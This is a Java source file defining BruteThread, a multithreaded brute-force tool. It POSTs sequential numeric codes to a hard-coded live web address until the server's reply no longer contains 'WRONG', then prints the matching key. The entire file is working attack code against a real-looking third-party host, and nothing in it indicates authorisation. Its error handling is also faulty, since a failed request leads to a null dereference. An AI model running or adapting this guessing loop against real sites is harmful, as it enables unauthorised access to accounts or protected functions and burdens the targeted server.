import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

//Class for picking key in threads
public class BruteThread implements Runnable {
    private static final    String url = "http://www.rollshop.co.il/test.php";
    private static AtomicInteger keyInt = new AtomicInteger(0);
    private static AtomicBoolean keyFound = new AtomicBoolean(false);

    @Override
    public void run() {
        //if key not found we trying again
        while (!keyFound.get()) {
            String key = String.valueOf(keyInt.getAndIncrement());
            System.out.println("Attempting key " + key);
            String response = tryKey(url, key);
            //if key is found we inform user about right key and make stop other threads
            if (!response.contains("WRONG")) {
                keyFound.set(true);
                System.out.println("Key is found! Right key is - " + key + "\n" + response);
            }
        }

    }


    //Trying key for given url, just HttpURLConnection, OutputStreamWriter and BufferedReader.
    //Returns response as String.
    private String tryKey(String url,String key) {
        StringBuffer sb = null;

        try {

            String data = URLEncoder.encode("code", "UTF-8") + "="
                    + URLEncoder.encode(key, "UTF-8");


            URL requestUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) requestUrl
                    .openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");

            OutputStreamWriter osw = new OutputStreamWriter(
                    conn.getOutputStream());
            osw.write(data);
            osw.flush();

            BufferedReader br = new BufferedReader(new InputStreamReader(
                    conn.getInputStream()));

            String in;
            sb = new StringBuffer();

            while ((in = br.readLine()) != null) {
                sb.append(in).append("\n");
            }

            osw.close();
            br.close();
        } catch (IOException e) {
            e.printStackTrace();


        }

        //noinspection ConstantConditions
        return sb.toString();


    }

}
